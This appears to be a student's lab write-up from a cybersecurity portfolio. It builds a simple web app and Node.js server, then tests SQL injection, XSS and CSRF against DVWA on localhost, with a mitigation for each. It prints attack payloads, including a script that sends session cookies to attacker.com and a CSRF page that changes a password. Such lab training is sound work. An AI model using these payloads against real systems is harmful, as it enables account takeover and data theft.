# Web Development Components and Security Threats

## Overview

This lab examined the architecture of modern web applications by building both front-end and back-end components from scratch, then testing them against the OWASP Top 10 vulnerabilities. The goal was to understand how HTML, CSS, and JavaScript interact to create user interfaces, how Node.js servers handle HTTP requests, and how poor implementation of either layer exposes applications to severe security risks.

## Objectives

- Identify the roles of front-end technologies (HTML, CSS, JavaScript) and back-end technologies (Node.js, databases, frameworks)
- Build a functional web application with interactive elements and server-side request handling
- Understand how front-end and back-end components communicate through HTTP
- Test common web vulnerabilities (SQL injection, XSS, CSRF) against intentionally vulnerable applications
- Analyze the security impact of each vulnerability type on data confidentiality and application integrity
- Document mitigation techniques for each OWASP Top 10 threat

## Lab Environment

- **Development Machine:** Kali Linux
- **Front-End Testing:** Firefox browser with custom HTML/CSS/JavaScript application
- **Back-End Testing:** Node.js server running on localhost:3000
- **Vulnerable Application:** DVWA (Damn Vulnerable Web Application) for exploit testing
- **Network:** Local development environment with loopback interface (127.0.0.1)

## Tools Used

- HTML5, CSS3, JavaScript (front-end development)
- Node.js with http, fs, and path modules (back-end server)
- Firefox Developer Tools (network traffic inspection)
- DVWA (vulnerability testing platform)
- Text editor for code development

## Methodology

### Exercise 1: Front-End Component Architecture

**Understanding the three-layer structure:**

Web applications separate concerns into three distinct technologies. HTML defines structure (what elements exist), CSS controls presentation (how elements look), and JavaScript handles behavior (how elements respond to user actions).

- **HTML (Hypertext Markup Language):** The structural skeleton. It defines what objects exist on a page - paragraphs, input fields, forms, buttons, headings, and navigation menus. Without HTML, there is no document structure for the browser to render.

- **CSS (Cascading Style Sheets):** The visual design layer. It controls how HTML elements appear - their sizes, colors, positions, fonts, and layouts. CSS transforms raw HTML structure into visually organized interfaces.

- **JavaScript:** The interactive behavior engine. It allows pages to respond to user actions without reloading. JavaScript can update the DOM (Document Object Model) dynamically, validate form inputs, display alerts, fetch data from servers, and manipulate page content in real time.

- **Modern frameworks (React, Angular, Vue.js):** These are pre-built component libraries that provide structure and security patterns out of the box. Instead of writing every event handler and state manager from scratch, frameworks supply tested building blocks for complex applications. They enforce consistent patterns that reduce the chance of introducing vulnerabilities through custom code.

![Code editor showing HTML structure with navigation and form elements](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/35_01%20Code%20editor%20showing%20HTML%20structure%20with%20navigation%20and%20form%20elements.jpg)

**Building the application:**

I created a web application with three required components:

1. **Header with navigation menu:** HTML `<nav>` element containing links to Home, JavaScript, Contact, and Database sections. This demonstrates basic site navigation structure.

2. **Contact form:** HTML form with input fields for name, email, phone, and message. The form uses `type="text"` for name, `type="email"` for email validation, `type="tel"` for phone numbers, and `<textarea>` for the message field. Form validation ensures required fields cannot be submitted empty.

3. **Interactive button:** JavaScript event listener attached to a button that changes displayed text on click. When triggered, the button toggles between two messages without page reload, demonstrating client-side interactivity.

![Rendered web application showing purple theme with navigation, form, and database section](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/35_02%20Rendered%20web%20application%20showing%20purple%20theme%20with%20navigation%2C%20form%2C%20and%20database%20section.jpg)

**How the three layers interact:**

Looking at the rendered application, the interaction pattern becomes clear:

- HTML defined the form fields and "Delete" button structure
- CSS styled the purple layout, card backgrounds, and button colors
- JavaScript captured the submission event and updated the DOM dynamically to show "Database - All Submissions" section

When a user clicks "Delete", JavaScript prevents the default form submission, captures the event, and updates the page content without sending an HTTP request. This is client-side interactivity.

- **Security vulnerabilities in poorly implemented front-end code:**

- **Cross-Site Scripting (XSS):** Occurs when applications include untrusted data in web pages without proper validation or escaping. If an attacker injects malicious JavaScript into an input field and the application renders that script directly into the HTML structure, the browser executes it under the victim's session context.

For example, if the contact form takes user input and displays it back on the page without sanitization:

```javascript
// Vulnerable code
messageDisplay.innerHTML = userInput;
```

An attacker submits `<script>alert('hacked')</script>` as their message. The application inserts this directly into the page. The browser interprets it as legitimate code and executes the alert. In a real attack, this script would steal session cookies, redirect to phishing sites, or log keystrokes.

**Proper mitigation:**

```javascript
// Safe code
messageDisplay.textContent = userInput;  // Treats input as text, not HTML
```

- **Cross-Site Request Forgery (CSRF):** Exploits the fact that browsers automatically include session cookies with every request to a domain. If a user is authenticated to your application and visits a malicious site, that site can trick the user's browser into sending unauthorized requests to your application.

- The "Delete" button in the screenshot could be vulnerable. If the delete action is triggered by a simple GET request without CSRF protection:

```html
<!-- Vulnerable button -->
<a href="/delete?id=1">Delete</a>
```

A malicious site creates a hidden image tag:

```html
<img src="https://yourapp.com/delete?id=1" style="display:none">
```

When a logged-in user visits the malicious site, their browser automatically sends the request with their session cookie, deleting their data without their knowledge or consent.

- **Proper mitigation:** Use POST requests for state-changing actions, implement anti-CSRF tokens, and require re-authentication for critical operations.

### Exercise 2: Back-End Component Architecture

**Understanding server-side roles:**

- The back-end handles data persistence, business logic execution, and access control enforcement. While the front-end runs in the user's browser (untrusted environment), the back-end runs on your server (trusted environment). This separation is critical for security.

**Server-side programming languages:**

- **Node.js:** Asynchronous, event-driven JavaScript runtime. Handles concurrent connections efficiently without blocking. Used for real-time applications, APIs, and microservices.

- **Python:** High-level language with readable syntax. Common in data processing, machine learning backends, and web applications. Flask and Django are popular Python frameworks.

- **PHP:** Server-side scripting language embedded in HTML. Powers WordPress, Drupal, and legacy applications. Widely deployed but requires careful configuration to avoid vulnerabilities.

- **Java:** Robust, object-oriented language for enterprise applications. Strongly typed with extensive security libraries. Used in banking, government, and large-scale systems.

**Web frameworks:**

Frameworks provide routing systems, template engines, session management, and security controls so developers don't reinvent basic server functions.

- **Express (Node.js):** Minimal and flexible. Gives you routing and middleware but requires manual security configuration.

- **Django (Python):** Batteries-included framework with built-in CSRF protection, SQL injection prevention through ORM, and XSS escaping in templates.

- **Laravel (PHP):** Modern PHP framework with elegant syntax, built-in authentication, and security helpers.

**Database management systems:**

The storage layer where persistent data lives.

- **MySQL:** Relational database organizing data into tables with strict schemas. Supports ACID transactions for financial applications.

- **PostgreSQL:** Advanced relational database with extensibility and data integrity features. Handles complex queries and supports JSON data types.

- **MongoDB:** NoSQL document database storing data in flexible JSON-like documents. Scales horizontally for high-traffic applications but requires careful query construction to avoid injection.

**Building the Node.js server:**

I created a basic HTTP server that handles file requests and returns HTML content.

![Node.js server code showing HTTP request handling and file serving](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/35_03%20Node.js%20server%20code%20showing%20HTTP%20request%20handling%20and%20file%20serving.jpg)

**Server architecture breakdown:**

```javascript
const http = require('http');
const fs = require('fs');
const path = require('path');

const server = http.createServer((req, res) => {
  if (req.url === '/' || req.url === '/app.html') {
    const filePath = path.join(__dirname, 'app.html');
    
    fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) {
        res.writeHead(404, { 'Content-Type': 'text/html' });
        res.end('<h1>404 - File Not Found</h1>');
        return;
      }
      
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(data);
    });
  }
});
```

**How the server works:**

1. **Request interception:** When a browser sends an HTTP request to localhost:3000, the server's callback function receives the request object (`req`) and response object (`res`).

2. **Path evaluation:** The server checks `req.url` to determine which file the browser is requesting. If the URL is "/" or "/app.html", it proceeds to serve the file.

3. **File path construction:** Using `path.join(__dirname, 'app.html')`, the server securely constructs the full file path. The `__dirname` variable contains the directory where server.js is located, preventing directory traversal attacks.

4. **File reading:** `fs.readFile()` attempts to read the HTML file from disk. This is an asynchronous operation that doesn't block other incoming requests.

5. **Error handling:** If the file doesn't exist, the server responds with HTTP 404 status code and an error message.

6. **Success response:** If the file exists, the server sends HTTP 200 status code with `Content-Type: text/html` header and the file contents as the response body.

**Verifying server functionality:**

- The terminal confirms: "Server is running at http://localhost:3000" and "Open your browser and visit: http://localhost:3000/app.html"

- This is not just a file being opened. The browser sent a structured HTTP GET request across the local network interface to port 3000, and the Node.js application responded with the HTML content.

![Browser developer tools showing HTTP request to localhost:3000](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/35_04%20Browser%20developer%20tools%20showing%20HTTP%20request%20to%20localhost_3000.jpg)

**Proof of server-side rendering:**

The browser's network inspector shows:

- **Request URL:** http://localhost:3000/app.html
- **Request Method:** GET
- **Status Code:** 200 OK
- **Remote Address:** [::1]:3000 (IPv6 notation for 127.0.0.1)

The `Remote Address: [::1]:3000` confirms the machine's network interface routed web traffic through the Node.js application process. The file was not opened from the desktop file manager. It was served through HTTP by the back-end server.

**Back-end responsibilities in secure architecture:**

- **Data persistence:** The back-end is the only component allowed to read from or write to the database. The front-end never connects to the database directly. Every data request flows through the back-end, which validates permissions before executing queries.

- **Business logic execution:** Core application rules run server-side where users cannot tamper with them. For example, calculating account balances, processing payments, or determining user permissions must happen on the back-end. If these calculations happened in JavaScript, users could modify the code in their browser to bypass restrictions.

- **Access control enforcement:** The back-end verifies authentication (who you are) and authorization (what you can access). Every API request must include credentials that the back-end validates before returning data. Session cookies, JWT tokens, or API keys are checked server-side for every protected resource.

**Why back-end vulnerabilities are more severe:**

- A front-end XSS vulnerability affects individual users by compromising their browser sessions. A back-end SQL injection vulnerability affects the entire application by compromising the database.

- If an attacker exploits XSS, they steal one user's session cookie and hijack that specific account. If an attacker exploits SQL injection, they dump the entire users table containing every account's credentials, emails, and personal data. They can also modify data, delete records, or execute operating system commands on the database server.

- Front-end flaws are client-side (limited scope). Back-end flaws are server-side (catastrophic scope).

### Exercise 3: Testing OWASP Top 10 Vulnerabilities

**Research findings - five critical threats:**

**1. SQL Injection (A03:2021 - Injection)**

**How it works:** User input is concatenated directly into SQL query strings instead of being parameterized. This allows attackers to manipulate the query structure.

Vulnerable code:
```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";
```

If an attacker submits `admin' OR '1'='1` as the username, the query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

The `OR '1'='1'` condition is always true, bypassing authentication entirely.

**Impact:**
- Bypass login screens without valid credentials
- Extract entire database tables (data exfiltration)
- Modify or delete records (data tampering)
- Execute administrative operations or OS commands on the database server

**2. Cross-Site Scripting (A03:2021 - Injection)**

**How it works:** Applications accept user input and render it directly onto pages without validation or context-aware encoding.

**Three types:**

- **Stored XSS:** Malicious script saved to database, executes every time the page loads
- **Reflected XSS:** Script parsed immediately from URL parameters or form submissions
- **DOM-based XSS:** Script handled entirely by client-side JavaScript without server involvement

**Impact:**
- Session hijacking (stealing session tokens/cookies)
- Keystroke logging to capture passwords
- Website defacement
- Forced redirects to phishing domains

**3. Cross-Site Request Forgery (CSRF)**

**How it works:** Browsers automatically attach session credentials (cookies) to every HTTP request sent to a domain. Malicious sites exploit this by tricking authenticated users into executing unwanted actions.

**Attack scenario:** User is logged into their bank account. They visit a malicious site that contains:
```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

The browser automatically sends the request with the user's session cookie. The bank processes the transfer because the request appears to come from the legitimate authenticated user.

**Impact:**
- Change account email addresses or passwords
- Transfer funds or make purchases
- Execute administrative actions
- Modify user data without knowledge or consent

**4. Security Misconfiguration (A05:2021)**

**How it works:** Applications deployed with default settings, unoptimized configurations, or overly permissive access policies.

**Common examples:**
- Default administrator accounts left active (admin/admin)
- Unused features enabled (directory listing, debug mode)
- Verbose error messages revealing stack traces and file paths
- Unprotected cloud storage buckets
- Outdated software with known vulnerabilities

**Impact:**
- Attackers use default credentials for immediate access
- Error logs expose code patterns and database structures
- Cloud buckets leak sensitive documents and customer data
- Outdated services exploited through published CVEs

**5. Insecure Deserialization (A08:2021 - Software and Data Integrity Failures)**

**How it works:** Serialization converts complex objects into flat text for storage or transmission. Insecure deserialization occurs when servers rebuild objects from user-provided serialized data without validating integrity.

**Attack scenario:** Application stores user session data as serialized objects. Attacker modifies the serialized string to change their role from "user" to "admin". When the server deserializes this tampered data, it rebuilds the object with administrator privileges.

**Impact:**
- Manipulate application state and logic
- Bypass access control restrictions
- Instantiate forbidden system objects
- Achieve Remote Code Execution (RCE) for full system control

**Practical vulnerability testing:**

**SQL Injection attack:**

I tested DVWA's login form with the classic SQL injection payload: `1' OR '1'='1`

![DVWA SQL injection showing bypassed authentication](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/35_05%20DVWA%20SQL%20injection%20showing%20bypassed%20authentication.jpg)

**What happened:** The application constructed this query:
```sql
SELECT * FROM users WHERE user_id = '1' OR '1'='1'
```

Because `'1'='1'` is always true, the query returned all users in the database. The application displayed:

- ID: 1, First name: admin, Surname: admin
- ID: 1, First name: Gordon, Surname: Brown
- ID: 1, First name: Hack, Surname: Me
- ID: 1, First name: Pablo, Surname: Picasso
- ID: 1, First name: Bob, Surname: Smith

This confirms the application is vulnerable to SQL injection. An attacker can extract the entire users table with a single malicious input.

**XSS attack:**

I injected a JavaScript payload into an input field to test for reflected XSS.

![XSS payload execution showing alert popup with session cookie](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/35_06%20XSS%20payload%20execution%20showing%20alert%20popup%20with%20session%20cookie.jpg)

**Payload used:** `<script>alert(document.cookie)</script>`

**What happened:** The application echoed my input directly into the HTML response without sanitization. The browser interpreted the `<script>` tag as executable code and displayed an alert popup containing:

```
security=low; PHPSESSID=b9f8ec0d8430e3e8d0ac0e455140904b
```

This proves the application is vulnerable to XSS. Instead of a harmless alert, an attacker would inject:

```javascript
<script>
document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```

This sends the victim's session cookie to the attacker's server, allowing full account takeover.

**CSRF attack:**

I created a malicious HTML file that automatically submits a password change request when loaded.

![CSRF attack HTML code showing hidden form auto-submission](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/35_07%20CSRF%20attack%20HTML%20code%20showing%20hidden%20form%20auto-submission.jpg)

**Attack code:**
```html
<body>
  <h1>You've won a prize! Click here!</h1>
  <img src="http://127.0.0.1:42001/vulnerabilities/csrf/password_new-abc1236password_conf=abc1236Change=Change#">
</body>
```

The attacker embeds a malicious URL that changes the victim's password to "abc1236" into what appears to be a prize notification. When the page loads, the browser automatically sends the request with the victim's session cookie.

![Browser showing CSRF attack page with password change attempt](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/35_08%20Browser%20showing%20CSRF%20attack%20page%20with%20password%20change%20attempt.jpg)

- **Result:** The page loaded and attempted to execute the password change request. However, because this is a demonstration without an active authenticated session, the attack requires the victim to be logged in for the CSRF to succeed.

- **Real-world scenario:** If the victim was logged into DVWA in another tab and clicked this link, their password would change immediately without any confirmation or awareness. The attacker would then log in with the new password and take over the account.

**Impact analysis and mitigation strategies:**

**SQL Injection:**

**Impact on user data:**
- Destroys data confidentiality by allowing unauthorized database queries
- Exfiltrates passwords (plaintext or hashed), PII, financial records, proprietary data
- Exposes entire database contents to attackers

**Impact on application integrity:**
- Compromises data integrity through unauthorized modifications
- Deletes or corrupts database tables
- Bypasses authentication to gain administrative access
- Potentially executes OS commands on database server

**Mitigation measures:**
- Use parameterized queries (prepared statements) to separate code from data
- Implement Object-Relational Mappers (ORMs) that handle escaping automatically
- Enforce strict input validation using allow-lists
- Apply principle of least privilege to database accounts (no DROP/CREATE permissions)

**Cross-Site Scripting:**

**Impact on user data:**
- Steals active session cookies and tokens for account takeover
- Deploys keyloggers to capture credentials as users type
- Hijacks authenticated sessions to impersonate users

**Impact on application integrity:**
- Defaces website visual structure
- Injects malicious forms to capture credentials (phishing)
- Forces unauthorized actions within the user's session context
- Manipulates DOM to redirect users to attacker-controlled sites

**Mitigation measures:**
- Implement context-aware output encoding (HTML, JavaScript, CSS, attribute encoding)
- Deploy Content Security Policy (CSP) headers to restrict script sources
- Set HttpOnly and Secure flags on cookies to prevent JavaScript access
- Use frameworks with built-in XSS protection (React, Angular, Vue.js)

**Cross-Site Request Forgery:**

**Impact on user data:**
- Indirectly exposes data by forcing state-changing operations
- Changes account email addresses, passwords, or profile settings
- Results in full account takeover without user awareness

**Impact on application integrity:**
- Breaks transaction and operational integrity
- Backend cannot distinguish legitimate requests from forged ones
- Enables unauthorized data creation, modification, or deletion
- Bypasses user consent for critical actions

**Mitigation measures:**
- Generate unique, cryptographically secure anti-CSRF tokens for every state-changing request
- Configure SameSite=Strict or SameSite=Lax on session cookies
- Require re-authentication for critical actions (password resets, fund transfers)
- Validate Referer and Origin headers server-side

**Security Misconfiguration:**

**Impact on user data:**
- Massive data leaks through exposed directories and unencrypted storage
- Open database ports provide direct access to user records
- Default accounts create immediate entry points to sensitive data

**Impact on application integrity:**
- Exposes internal architecture and framework details
- Verbose error logs reveal file paths, database structures, and software versions
- Makes it easier for attackers to discover and exploit specific vulnerabilities
- Provides roadmap for targeted attacks

**Mitigation measures:**
- Establish automated hardening process for all environments
- Disable or remove default accounts, passwords, and unused services
- Suppress verbose error messages in production (log them securely instead)
- Implement security headers (X-Frame-Options, X-Content-Type-Options, HSTS)
- Regular security audits and penetration testing

## Findings

- **Front-end and back-end serve distinct security roles in web applications.** The front-end handles presentation and user interaction but runs in an untrusted environment (the user's browser). The back-end enforces business logic, access control, and data persistence in a trusted environment (your server). This separation is fundamental to secure architecture.

- **Client-side vulnerabilities (XSS, CSRF) target individual users through their browsers.** XSS allows attackers to execute malicious JavaScript in victim sessions, stealing cookies and hijacking accounts. CSRF tricks authenticated browsers into sending unauthorized requests by exploiting automatic cookie transmission. Both bypass the user's intent by manipulating client-side execution.

- **Server-side vulnerabilities (SQL injection, insecure deserialization) compromise entire applications.** SQL injection grants direct database access, exposing all user records, not just one account. Insecure deserialization can lead to remote code execution, giving attackers full control over the server. The scope of damage is system-wide, not limited to individual users.

- **Security misconfiguration creates entry points for all other attacks.** Default credentials provide immediate access without needing to exploit code vulnerabilities. Verbose error messages expose software versions and internal paths, making targeted exploitation easier. Unprotected cloud storage leaks sensitive data without requiring any attack at all.

- **Proper input validation and output encoding are the foundation of web security.** Treating all user input as untrusted and validating against strict allow-lists prevents injection attacks. Context-aware encoding ensures user-provided data displays safely without executing as code. These two principles address the majority of OWASP Top 10 vulnerabilities.

- **Frameworks provide security by default when used correctly.** Modern frameworks like Django and Laravel include built-in CSRF protection, SQL injection prevention through ORMs, and XSS escaping in templates. Using these frameworks correctly eliminates entire vulnerability classes that would exist in hand-written code.

- **Session management requires multiple layers of protection.** HttpOnly flags prevent JavaScript from accessing cookies, blocking XSS-based session theft. Secure flags ensure cookies only transmit over HTTPS, preventing interception. SameSite attributes prevent CSRF by controlling cross-site cookie behavior. All three must be implemented together for proper session security.

## Challenges Faced

- **Understanding the difference between front-end and back-end responsibility:** Initially, I thought the front-end could validate input to prevent attacks. Testing showed that front-end validation is purely for user experience. Attackers bypass it entirely by sending requests directly to the server. All security validation must happen server-side because the client is untrusted.

- **Node.js asynchronous callback structure:** The file reading operation uses a callback function that executes after the file loads. This is different from synchronous code where operations complete in order. I had to understand that `fs.readFile()` doesn't block the server. It continues accepting other requests while waiting for disk I/O to complete.

- **Path traversal prevention in file serving:** My initial code used `req.url` directly to construct file paths. This would allow attackers to request `../../etc/passwd` to read system files. Using `path.join(__dirname, filename)` and restricting allowed paths prevents directory traversal attacks.

- **CSRF attack demonstration requirements:** The CSRF attack only succeeds if the victim is already authenticated to the target application. During testing, I had to maintain an active DVWA session in one browser tab while opening the malicious page in another tab. Without this pre-authentication, the attack fails because the browser doesn't send session cookies.

- **XSS payload encoding issues:** Some of my initial XSS payloads didn't execute because the application partially encoded certain characters but not others. This taught me that incomplete output encoding is still vulnerable. I had to test multiple payload variations to find which characters the application failed to sanitize.

## Key Takeaways

- **Never trust the client.** Any code running in the browser can be modified by the user. Front-end validation improves user experience but provides zero security. All security checks must happen server-side where users cannot tamper with them.

- **Separation of code and data prevents injection attacks.** SQL injection happens when user input is concatenated into query strings. Parameterized queries treat input as data, never as code. The same principle applies to XSS - treat user input as text to display, never as HTML to render or JavaScript to execute.

- **Default configurations are default vulnerabilities.** Production systems must be hardened beyond installation defaults. Change default passwords, disable unused services, suppress error messages, and apply security headers. Default settings prioritize ease of setup over security.

- **Session management is more complex than setting cookies.** Secure sessions require HttpOnly flags (prevent JavaScript access), Secure flags (HTTPS only), SameSite attributes (CSRF prevention), strong random session IDs, proper expiration, and server-side validation. Missing any one control creates an attack vector.

- **Frameworks encode institutional security knowledge.** Modern frameworks include protections developed through years of vulnerability research. Django's ORM prevents SQL injection by design. React's JSX escapes output by default. Using these frameworks properly means inheriting security patterns without having to implement them manually.

- **Security is about understanding attack mechanics, not memorizing fixes.** Knowing that SQL injection exploits string concatenation helps you recognize the vulnerability in any language. Understanding how XSS executes in the DOM helps you identify unsafe output contexts. This knowledge transfers across technologies and survives framework changes.

## Disclaimer

This lab was performed in a controlled environment using intentionally vulnerable applications designed for security training. DVWA (Damn Vulnerable Web Application) is a legal testing platform created for educational purposes. All testing was conducted on local virtual machines with no network exposure. No unauthorized systems were accessed or attacked.
